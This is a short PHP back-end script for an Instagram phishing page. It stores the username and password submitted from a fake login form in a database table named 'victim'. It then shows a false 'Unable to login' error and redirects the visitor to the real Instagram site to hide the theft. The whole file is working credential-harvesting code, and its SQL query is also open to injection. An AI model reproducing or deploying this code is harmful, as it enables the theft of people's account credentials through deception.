<?php
    if(isset($_POST["u_name"])){
        $server = "localhost";
        $uername = "root";
        $password = "";

        $conn = mysqli_connect($server, $uername, $password);

        if (!$conn){
            die("Connection failed". mysqli_connect_error());
        }

        $name = $_POST['u_name'];
        $password = $_POST['pass'];

        $sql = "INSERT INTO `insta_logins`.`victim` (`sno`, `username_email_ph`, `password`) VALUES (NULL, '$name', '$password')";

        if ($conn->query($sql)){
            echo "<script type='text/javascript'>alert('Error ! Unable to login ');
            window.location.replace('https://www.instagram.com');
            </script>";
        }else{
            echo "<script type='text/javascript'>alert('Please enter correct username or password. Try again ');
            window.history.go(-1);
            </script>";
        }
    }
?>
